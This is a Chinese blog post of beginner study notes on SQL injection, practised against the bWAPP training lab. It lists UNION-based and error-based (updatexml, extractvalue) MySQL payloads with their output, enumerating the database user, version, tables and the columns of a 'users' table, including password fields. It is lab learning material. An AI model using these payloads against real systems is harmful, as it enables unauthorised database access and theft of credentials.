---
title: "简单sql注入学习"
date: 2021-08-17T13:48:22+08:00
draft: false
author: LYR
---



## sql 注入学习





### sql注入猜解

```sql
-- 猜字段数
union select 1,2 --
-- 猜数据库
select schema_name from database.schemata

-- 猜数据表列
select * from table_name
select table_name from database.tables where
 table_schema = "aaa"
-- 获取某列内容
select * from column_name

```



## bwapp使用



1. 访问 /install.php 初始化应用
2. 点击  sql injection(get/search) 练习



输入 1'  进行搜索 

结果：`Error: You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near '%'' at line 1`



输入： `' union select 1,2,user(),4,5,6,7 -- '`



| World War Z | 2013           | Gerry Lane | horror | [Link](http://www.imdb.com/title/tt0816711) |
| ----------- | -------------- | ---------- | ------ | ------------------------------------------- |
| 2           | root@localhost | 5          | 4      | [Link](http://www.imdb.com/title/6)         |

后面返回结果如图



| 常用函数                  |            |
| ------------------------- | ---------- |
| database()                | 数据库名字 |
| user()                    | 用户       |
| table_name                | 表名       |
| version()                 | 版本号     |
| information_schema.tables | 元信息     |



### 获取数据库信息

```sql
' union  select 1,user(),table_name,version(),database(),6,7 from information_schema.tables where table_schema=database() -- '
```

得到结果如下



| root@localhost | blog     | bWAPP | 5.5.47-0ubuntu0.14.04.1 | [Link](http://www.imdb.com/title/6) |
| -------------- | -------- | ----- | ----------------------- | ----------------------------------- |
| root@localhost | heroes   | bWAPP | 5.5.47-0ubuntu0.14.04.1 | [Link](http://www.imdb.com/title/6) |
| root@localhost | movies   | bWAPP | 5.5.47-0ubuntu0.14.04.1 | [Link](http://www.imdb.com/title/6) |
| root@localhost | users    | bWAPP | 5.5.47-0ubuntu0.14.04.1 | [Link](http://www.imdb.com/title/6) |
| root@localhost | visitors | bWAPP | 5.5.47-0ubuntu0.14.04.1 | [Link](http://www.imdb.com/title/6) |



```sql
'union select 1,group_concat(column_name),user(),4,5,6,7 from information_schema.columns where table_name='users' -- '
```



得到表信息

| World War Z                                                  | 2013           | Gerry Lane | horror | [Link](http://www.imdb.com/title/tt0816711) |
| ------------------------------------------------------------ | -------------- | ---------- | ------ | ------------------------------------------- |
| id,login,password,email,secret,activation_code,activated,reset_code,admin | root@localhost | 5          | 4      | [Link](http://www.imdb.com/title/6)         |





### 删库测试



```sql
#  尝试构建脚本
'   union  select 1,2,3,4,5,6,7   --'
# 原理： select * from movies  where title like ''   union  select 1,2,3,4,5,6,7   --' 
'   union  select 1,2,3,( select 'fuck') ,5,6, 7  --'


 iron ' union  select 1,2,3,4,5,6,7    #
 iron ' union  select 1,2,user(),@@version,5,6,7    #
Iron Man' AND 0 UNION SELECT 1,2,3,4,5,6,7 #

```



### 查询数据库版本

```sql
Olivia' or updatexml(1,concat(0x7e,(version())),0) or '
```

### 查询数据库

```sql
Olivia' or extractvalue(1,concat(0x7e,database())) or '
```





